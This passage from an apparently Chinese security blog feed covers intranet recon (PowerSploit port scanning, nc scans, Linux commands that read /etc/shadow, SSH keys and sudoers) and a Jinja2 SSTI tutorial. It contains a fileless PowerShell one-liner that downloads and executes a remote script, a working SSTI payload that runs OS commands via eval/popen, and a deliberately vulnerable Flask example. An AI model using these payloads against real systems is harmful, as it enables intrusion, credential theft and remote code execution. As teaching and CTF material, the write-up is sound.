class="hljs-variable">$startdate</span>).TotalSeconds<br>            <span class="hljs-variable">$endMsg</span> = <span class="hljs-string">&quot;Port scan complete at <span class="hljs-variable">$enddate</span> (<span class="hljs-variable">$totaltime</span> seconds)&quot;</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                <span class="hljs-variable">$endMsg</span> += <span class="hljs-string">&quot;, <span class="hljs-variable">$upHosts</span> hosts are up&quot;</span><br>            &#125;<br><br>            <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-comment</span> <span class="hljs-variable">$endMsg</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$grepStream</span>) &#123;<br>                <span class="hljs-variable">$grepStream</span>.Close()<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                <span class="hljs-variable">$xmlStream</span>.Close()<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$readableStream</span>) &#123;<br>                <span class="hljs-variable">$readableStream</span>.Close()<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$scannedHostList</span><br><br>        &#125;<br>        <span class="hljs-keyword">Catch</span><br>        &#123;<br>            <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>无文件落地</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;<br></code></pre></td></tr></table></figure><ul><li>有文件落地</li></ul><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;<br></code></pre></td></tr></table></figure></blockquote><h3 id="Telnet-1"><a href="#Telnet-1" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote><p>telnet DC 22</p></blockquote><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><blockquote><p>search portscan</p><p>use anxiliary/scanner/portscan/tcp</p></blockquote><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><blockquote><p>nc.exe -vv 192.168.7.7 3389</p><p>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535</p><p>-r 随机指定本地与远端主机的通信端口<br>-z 使用 0 输入/输出模式，只在扫描通信端口时使用<br>-w&lt;超时秒数&gt; 设置等待连线的时间</p></blockquote><h3 id="fscan-1"><a href="#fscan-1" class="headerlink" title="fscan"></a>fscan</h3><h3 id="scanline-1"><a href="#scanline-1" class="headerlink" title="scanline"></a>scanline</h3><p>见上</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>linux 有域控的概念吗 我的看法是没有 但是可以配置对应的功能，或者加入域，这些是可以实现的</p><p>下面是一些在 linux 内网的信息收集</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><ul><li><ul><li><p>版本信息</p><p><code>uname -a</code> 所有版本 <code>uname -r</code> 内核版本信息 <code>uname -n</code> 系统主机名字 <code>uname -m</code> Linux 内核架构</p></li></ul></li><li><p>内核信息 <code>cat /proc/version</code></p></li><li><p>CPU 信息 <code>cat /proc/cpuinfo</code></p></li><li><ul><li><p>发布信息</p><p><code>cat /etc/*-release</code> <code>cat /etc/issue</code></p></li></ul></li><li><p>主机名 <code>hostname</code></p></li><li><p>文件系统 <code>df -a</code></p></li><li><p>内核日志 <code>dmesg</code> / <code>/var/log/dmesg</code></p></li></ul><h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul><li><p>列出系统所有用户 <code>cat /etc/passwd</code></p></li><li><p>列出系统所有组 <code>cat /etc/group</code></p></li><li><p>列出所有用户 hash（root）<code>cat /etc/shadow</code></p></li><li><ul><li><p>用户</p><p>查询用户的基本信息 <code>finger</code> 当前登录的用户 <code>users</code> <code>who -a</code> <code>/var/log/utmp</code> 查询无密码用户 <code>grep &#39;x:0:&#39; /etc/passwd</code></p></li></ul></li><li><p>目前登录的用户 <code>w</code></p></li><li><p>登入过的用户信息 <code>last</code> / <code>/var/log/wtmp</code></p></li><li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> / <code>/var/log/lastlog</code></p></li><li><p>登录成功日志 <code>/var/log/secure</code></p></li><li><p>登录失败日志 <code>/var/log/faillog</code></p></li><li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p></li><li><p>查看 passwd 最后修改时间 <code>ls -l /etc/passwd</code></p></li><li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><ul><li><p>查看具有 sudo 权限的用户</p><p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p></li></ul></li></ul><h3 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a>用户和权限信息</h3><ul><li>当前用户 <code>whoami</code></li><li>当前用户信息 <code>id</code></li><li>可以使用 sudo 提升到 root 的用户（root） <code>cat /etc/sudoers</code></li><li>列出目前用户可执行与无法执行的指令 <code>sudo -l</code></li></ul><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul><li>打印系统环境信息 <code>env</code></li><li>打印系统环境信息 <code>set</code></li><li>环境变量中的路径信息 <code>echo $PATH</code></li><li>打印历史命令 <code>history</code> / <code>~/.bash_history</code></li><li>显示当前路径 <code>pwd</code></li><li>显示默认系统遍历 <code>cat /etc/profile</code></li><li>显示可用的 shell <code>cat /etc/shells</code></li></ul><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul><li>查看进程信息 <code>ps aux</code></li><li>资源占有情况 <code>top -c</code></li><li>查看进程关联文件 <code>lsof -c $PID</code></li><li>完整命令行信息 <code>/proc/$PID/cmdline</code></li><li>进程的命令名 <code>/proc/$PID/comm</code></li><li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li><li>运行程序的符号链接 <code>/proc/$PID/exe</code></li><li>进程的环境变量 <code>/proc/$PID/environ</code></li><li>进程打开文件的情况 <code>/proc/$PID/fd</code></li></ul><h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><ul><li>由 inetd 管理的服务列表 <code>cat /etc/inetd.conf</code></li><li>由 xinetd 管理的服务列表 <code>cat /etc/xinetd.conf</code></li><li>nfs 服务器的配置 <code>cat /etc/exports</code></li><li>邮件信息 <code>/var/log/mailog</code></li><li>ssh 配置 <code>sshd_config</code></li></ul><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>显示指定用户的计划作业（root） <code>crontab -l -u %user%</code></p><ul><li><ul><li><p>计划任务</p><p><code>/var/spool/cron/*</code> <code>/var/spool/anacron/*</code> <code>/etc/crontab</code> <code>/etc/anacrontab</code> <code>/etc/cron.*</code> <code>/etc/anacrontab</code></p></li></ul></li><li><ul><li><p>开机启动项</p><p><code>/etc/rc.d/init.d/</code></p></li></ul></li></ul><h3 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h3><ul><li>列出网络接口信息 <code>/sbin/ifconfig -a</code> / <code>ip addr show</code></li><li>列出网络接口信息 <code>cat /etc/network/interfaces</code></li><li>查看系统 arp 表 <code>arp -a</code></li><li>打印路由信息 <code>route</code> / <code>ip ro show</code></li><li>查看 dns 配置信息 <code>cat /etc/resolv.conf</code></li><li>打印本地端口开放信息 <code>netstat -an</code></li><li>列出 iptable 的配置规则 <code>iptables -L</code></li><li>查看端口服务映射 <code>cat /etc/services</code></li><li>Hostname <code>hostname -f</code></li><li>查看进程端口情况 <code>netstat -anltp | grep $PID</code></li></ul><h3 id="已安装程序"><a href="#已安装程序" class="headerlink" title="已安装程序"></a>已安装程序</h3><ul><li><code>rpm -qa --last</code> Redhat</li><li><code>yum list | grep installed</code> CentOS</li><li><code>ls -l /etc/yum.repos.d/</code></li><li><code>dpkg -l</code> Debian</li><li><code>cat /etc/apt/sources.list</code> Debian APT</li><li><code>pkg_info</code> xBSD</li><li><code>pkginfo</code> Solaris</li><li><code>pacman -Q</code> Arch Linux</li><li><code>emerge</code> Gentoo</li></ul><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><ul><li>最近五天的文件 <code>find / -ctime +1 -ctime -5</code></li><li>文件系统细节 <code>debugfs</code></li></ul><h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul><li><code>~/.ssh</code></li><li><code>/etc/ssh</code></li></ul><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><ul><li><code>/var/log/boot.log</code></li><li><code>/var/log/cron</code></li><li><code>/var/log/faillog</code></li><li><code>/var/log/lastlog</code></li><li><code>/var/log/messages</code></li><li><code>/var/log/secure</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/run/utmp</code></li></ul><h3 id="虚拟环境检测"><a href="#虚拟环境检测" class="headerlink" title="虚拟环境检测"></a>虚拟环境检测</h3><ul><li><code>lsmod | grep -i &quot;vboxsf\|vboxguest&quot;</code></li><li><code>lsmod | grep -i &quot;vmw_baloon\|vmxnet&quot;</code></li><li><code>lsmod | grep -i &quot;xen-vbd\|xen-vnif&quot;</code></li><li><code>lsmod | grep -i &quot;virtio_pci\|virtio_net&quot;</code></li><li><code>lsmod | grep -i &quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</code></li></ul><h3 id="容器内信息收集"><a href="#容器内信息收集" class="headerlink" title="容器内信息收集"></a>容器内信息收集</h3><ul><li><code>capsh --print</code></li><li><code>cat /proc/1/cgroup</code></li><li><code>env | grep KUBE</code></li><li><code>ls -l .dockerenv</code></li><li><code>ls -l /run/secrets/Kubernetes.io/</code></li><li><code>mount</code></li><li><code>ps aux</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2022/01/02/SSTI/"/>
    <url>/2022/01/02/SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="SSTI-服务端模板注入漏洞"><a href="#SSTI-服务端模板注入漏洞" class="headerlink" title="SSTI-服务端模板注入漏洞"></a>SSTI-服务端模板注入漏洞</h2><p>服务端模板注入是由于服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><h3 id="Flask-Jinja2-服务端模板注入"><a href="#Flask-Jinja2-服务端模板注入" class="headerlink" title="Flask(Jinja2)服务端模板注入"></a><strong>Flask(Jinja2)服务端模板注入</strong></h3><p>Jinja2 是用于 Python 的全功能模板引擎。它具有完整的 unicode 支持，一个可选的集成沙盒执行环境，已被广泛使用并获得 BSD 许可。 Jinja2 由 Django 或 Flask 之类的 Python Web 框架使用。</p><p>Jinja 官方网站：</p><p><a href="https://jinja.palletsprojects.com/en/2.11.x/">https://jinja.palletsprojects.com/en/2.11.x/</a></p><ul><li>注入测试</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Georg&#x27;</span>)<br>    t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br>    <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,port=<span class="hljs-string">&#x27;80&#x27;</span>)<br></code></pre></td></tr></table></figure><p>详细的 payload 分析和 nodejs 的原型链有点相似，下面分析一个 payload：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%for c in [].__class__.__base__.__subclasses__()%&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>        &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br>    &#123;%endif%&#125;<br>&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><p><strong>__class__</strong> ，是类的内置属性，可以用来引用类</p><p><strong>__base__</strong> ，返回类的基类</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__</span><br>&lt;class &#x27;list&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; _</span><br>&lt;class &#x27;list&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; _.__mro__</span><br>(&lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__base__</span><br>&lt;class &#x27;object&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__bases__</span><br>(&lt;class &#x27;object&#x27;&gt;,)<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__mro__[1]</span><br>&lt;class &#x27;object&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>可见<strong>__bases__，__mro__<strong>与</strong>__base__<strong>不同，我们需要拿到</strong>&lt;class ‘object’&gt;<strong>，当然也可以</strong>__mro__[1]<strong>来获得</strong>&lt;class ‘object’&gt;<strong>，下面都使用<strong><strong>base</strong></strong>来获取</strong>&lt;class ‘object’&gt;</strong></p><p><strong>__subclasses__</strong> ，每个类会保存它直接子类的弱引用组成的列表，此方法返回在这个类中直接子类引用组成的列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__base__.__subclasses__()</span><br>[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;nt.ScandirIterator&#x27;&gt;, &lt;class &#x27;nt.DirEntry&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;PyHKEY&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;os._AddedDllDirectory&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>所以当拿到 <strong>&lt;class ‘object’&gt;</strong> 时，就可以返回 Object 类的子类列表</p><p>进一步地，我们找到我们能够利用的子类(能执行命令或者可以读取文件的类就可以了，重点关注 os/file 这些关键字，使用 init.globals 来看看有没有 os module 或者其他的可以读写文件的)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[<span class="hljs-number">7</span>].__name__<br><span class="hljs-string">&#x27;list&#x27;</span><br>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[<span class="hljs-number">7</span>].__init__<br>&lt;slot <span class="hljs-keyword">wrapper</span> <span class="hljs-string">&#x27;__init__&#x27;</span> <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;list&#x27;</span> objects&gt;<br></code></pre></td></tr></table></figure><p>获得 Object 的子类 list，初始化 init 报了一个 wrapper，是指这些函数没有被重载，这时弹并不是 function，不具有<strong>__globals__</strong> 属性</p><p>现在使用上面的测试代码找一个具有<strong>__globals__</strong> 属性的函数</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102211933255.png"></p><p>os 找到下面的这个</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102212006476.png"></p><p>但是并不是 os，也没有发现 popen 函数，所以利用失败</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220047260.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220222810.png"></p><p>但是有<strong>__builtins__</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220723509.png"></p><p><a href="https://blog.csdn.net/lu8000/article/details/44217499/">https://blog.csdn.net/lu8000/article/details/44217499/</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102212658133.png"></p><p>当然不了解这个类的话，可以换，随便找了一个，再次搜看有没有 popen 函数</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221055005.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221116811.png"></p><p>利用</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221305536.png"></p><p>再介绍几个，如果存在的话可以不进行爆破， <strong>catch_warnings（有 eval），_Printer 和&lt;class ‘os._wrap_close’&gt;（这两个有 popen）</strong></p><p>然后像 sqlmap 一样，这个也有检测的脚本<a href="https://github.com/epinna/tplmap">tplmap</a></p><p>还有一些几个寻找子类的脚本备用</p><ul><li>万能利用</li></ul><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%for c in [].__class__.__base__.__subclasses__()%&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>        &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br>    &#123;%endif%&#125;<br>&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><ul><li>本地寻找本地的类脚本，适合源码题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">search = <span class="hljs-string">&#x27;popen&#x27;</span><br>num = -<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__():<br>    num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():<br>            <span class="hljs-built_in">print</span>(i,num)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>寻找题目中类的脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>a = <span 